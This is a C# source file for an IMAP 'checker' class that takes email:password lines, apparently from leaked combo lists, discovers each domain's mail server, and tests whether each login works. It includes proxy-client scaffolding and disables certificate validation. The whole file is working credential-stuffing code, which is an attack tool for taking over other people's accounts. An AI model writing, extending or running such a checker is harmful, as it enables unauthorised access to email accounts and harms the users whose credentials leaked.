using System.Net.Sockets;
using System.Runtime.CompilerServices;
using CheckerBase.App.Discovery;
using CheckerBase.App.Models;
using CheckerBase.Core.Engine;
using CheckerBase.Core.Proxies;
using CheckerBase.Core.Results;
using MailKit;
using MailKit.Net.Imap;
using MailKit.Net.Proxy;
using MailKit.Security;

namespace CheckerBase.App;

/// <summary>
/// IMAP checker implementation with automatic server discovery.
/// Uses Thunderbird-style autodiscovery to find IMAP server settings.
/// </summary>
public sealed class ImapChecker : IChecker<EmailEntry, ImapCheckResult, ImapClient>
{
    private readonly ServerDiscoveryService _discovery;

    public ImapChecker(ServerDiscoveryService discovery)
    {
        _discovery = discovery;
    }

    /// <summary>
    /// Quick validation - checks for email:password format.
    /// </summary>
    [MethodImpl(MethodImplOptions.AggressiveInlining)]
    public bool QuickValidate(ReadOnlySpan<char> line)
    {
        if (line.IsEmpty)
            return false;

        // Must have @ before :
        var atIdx = line.IndexOf('@');
        if (atIdx <= 0)
            return false;

        // Must have : after @
        var colonIdx = line.IndexOf(':');
        return colonIdx > atIdx && colonIdx < line.Length - 1;
    }

    /// <summary>
    /// Parse email:password line into EmailEntry.
    /// </summary>
    public EmailEntry? Parse(string line)
    {
        var span = line.AsSpan();

        var colonIdx = span.IndexOf(':');
        if (colonIdx <= 0)
            return null;

        var email = span[..colonIdx].Trim();
        var password = span[(colonIdx + 1)..].Trim();

        if (email.IsEmpty || password.IsEmpty)
            return null;

        // Extract domain from email
        var atIdx = email.IndexOf('@');
        if (atIdx <= 0 || atIdx >= email.Length - 1)
            return null;

        var domain = email[(atIdx + 1)..];

        return new EmailEntry(
            email.ToString(),
            password.ToString(),
            domain.ToString());
    }

    /// <summary>
    /// Process an email entry - discover servers and attempt login on each candidate.
    /// </summary>
    public async ValueTask<ProcessResult<ImapCheckResult>> ProcessAsync(
        EmailEntry entry,
        ImapClient client,
        CancellationToken cancellationToken)
    {
        // 1. Get candidates (may be single verified, or discovery list)
        var candidates = await _discovery.GetCandidatesAsync(entry.Domain, cancellationToken);

        if (candidates.Count == 0)
        {
            // No server found for this domain - mark as ignored (not retryable)
            return ProcessResult<ImapCheckResult>.Ignored();
        }

        // 2. Try each candidate until one works
        Exception? lastException = null;

        foreach (var config in candidates)
        {
            try
            {
                // Reconnect for each attempt (client may be in bad state)
                if (client.IsConnected)
                    await client.DisconnectAsync(true, cancellationToken);

                var socketOptions = config.Security switch
                {
                    SecurityType.Ssl => SecureSocketOptions.SslOnConnect,
                    SecurityType.StartTls => SecureSocketOptions.StartTls,
                    // StartTlsWhenAvailable is safer than Auto - tries STARTTLS if supported
                    _ => SecureSocketOptions.Auto
                };

                await client.ConnectAsync(config.Hostname, config.Port, SecureSocketOptions.Auto, cancellationToken);

                // Determine username format
                var username = config.UsernameFormat == UsernameFormat.Email
                    ? entry.Email
                    : entry.Email[..entry.Email.IndexOf('@')];

                await client.AuthenticateAsync(username, entry.Password, cancellationToken);

                // Success! Mark this config as verified for future lookups
                await _discovery.MarkVerifiedAsync(entry.Domain, config);

                await client.DisconnectAsync(true, cancellationToken);
                return ProcessResult<ImapCheckResult>.Success(new ImapCheckResult());
            }
            catch (AuthenticationException)
            {
                // Wrong password - no point trying other servers
                if (client.IsConnected)
                    await client.DisconnectAsync(true, cancellationToken);
                return ProcessResult<ImapCheckResult>.Failed();
            }
            catch (Exception ex) when (IsConnectionException(ex))
            {
                // Connection failed - try next candidate
                lastException = ex;
            }
        }

        // All candidates failed to connect
        return ProcessResult<ImapCheckResult>.Retry(lastException);
    }

    /// <summary>
    /// Checks if an exception is a connection-related exception.
    /// </summary>
    private static bool IsConnectionException(Exception ex)
        => ex is IOException or SocketException or TimeoutException
            or ServiceNotConnectedException or ProtocolException or SslHandshakeException;

    /// <summary>
    /// Creates an ImapClient configured with the provided proxy.
    /// </summary>
    public ImapClient CreateClient(Proxy? proxy)
    {
        var client = new ImapClient();
        //
        // if (proxy != null)
        // {
        //     client.ProxyClient = proxy.Type switch
        //     {
        //         ProxyType.Socks5 => CreateSocks5Client(proxy),
        //         ProxyType.Socks4 => CreateSocks4Client(proxy),
        //         ProxyType.Http => CreateHttpProxyClient(proxy),
        //         ProxyType.Https => CreateHttpsProxyClient(proxy),
        //         _ => null
        //     };
        // }

        client.Timeout = 30000;
        client.CheckCertificateRevocation = false;
        client.ServerCertificateValidationCallback = (_, _, _, _) => true;

        return client;
    }

    private static Socks5Client CreateSocks5Client(Proxy proxy)
    {
        if (!string.IsNullOrEmpty(proxy.Username))
        {
            return new(proxy.Host, proxy.Port,
                new(proxy.Username, proxy.Password));
        }

        return new(proxy.Host, proxy.Port);
    }

    private static Socks4Client CreateSocks4Client(Proxy proxy)
    {
        return new(proxy.Host, proxy.Port);
    }

    private static HttpProxyClient CreateHttpProxyClient(Proxy proxy)
    {
        if (!string.IsNullOrEmpty(proxy.Username))
        {
            return new(proxy.Host, proxy.Port,
                new(proxy.Username, proxy.Password));
        }

        return new(proxy.Host, proxy.Port);
    }

    private static HttpsProxyClient CreateHttpsProxyClient(Proxy proxy)
    {
        if (!string.IsNullOrEmpty(proxy.Username))
        {
            return new(proxy.Host, proxy.Port,
                new(proxy.Username, proxy.Password));
        }

        return new(proxy.Host, proxy.Port);
    }

    /// <summary>
    /// Determines if an exception is transient and should be retried.
    /// </summary>
    public bool IsTransientException(Exception exception)
        => IsConnectionException(exception) || exception is OperationCanceledException;
}